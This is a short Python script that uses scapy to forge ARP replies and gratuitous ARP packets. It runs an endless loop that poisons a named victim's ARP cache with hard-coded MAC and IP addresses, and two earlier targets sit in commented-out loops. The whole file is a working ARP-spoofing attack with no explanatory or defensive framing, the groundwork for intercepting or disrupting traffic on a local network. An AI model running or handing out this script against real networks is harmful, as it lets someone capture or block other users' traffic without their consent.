from scapy.all import *
import time

class ArpSpoofer:
  """
  Creates an object that creates spoofed ARP packets
  """
  def __init__(self):
    self.op = 2 # Default op set to 2: "is-at". 1 is for "who-has"  

  def spoof(self, victim_hwdst, victim_pdst, spoof_ip):
    a = ARP()
    a.op = self.op
    a.hwdst = victim_hwdst
    a.pdst = victim_pdst
    a.psrc = spoof_ip # spoof_ip is the IP you're pretending to be

    send(a)

  def gratuitous_arp(self, spoof_ip):
    a = ARP()
    a.op = self.op
    a.psrc = spoof_ip

    send(a)

spoofer = ArpSpoofer()
# while(True):
#   spoofer.gratuitous_arp("192.168.0.1")

# while(True):
#   spoofer.spoof("b8:e8:56:2c:f3:f8", "192.168.1.141", "192.168.1.144")
#   time.sleep(1)

while(True):
  spoofer.spoof("3c:15:c2:c4:d9:0a", "192.168.1.114", "192.168.1.144")
  time.sleep(1)
